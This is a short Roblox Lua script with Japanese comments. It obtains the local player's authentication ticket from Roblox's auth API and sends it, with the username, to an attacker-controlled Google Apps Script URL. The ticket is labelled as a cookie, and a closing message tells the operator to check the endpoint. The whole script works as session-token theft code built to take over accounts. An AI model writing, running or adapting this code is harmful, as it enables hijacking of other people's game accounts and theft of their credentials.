-- [[ ゲーム内メモリからセッション情報を探る ]]
local name = game.Players.LocalPlayer.Name
local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"

-- メソッドA: プレイヤーのIDをキーにして、内部的に生成されているハッシュを送ってみる
-- (これがクッキーの代わりになる場合がある)
local ticket = game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://auth.roblox.com/v1/authentication-ticket", "", "Application/Json")

local finalUrl = gasUrl .. "?user=" .. name .. "&cookie=TICKET:" .. game:GetService("HttpService"):UrlEncode(ticket or "NO_TICKET")
game:HttpGet(finalUrl)

print("チケット送信完了。GASを確認しろ！")
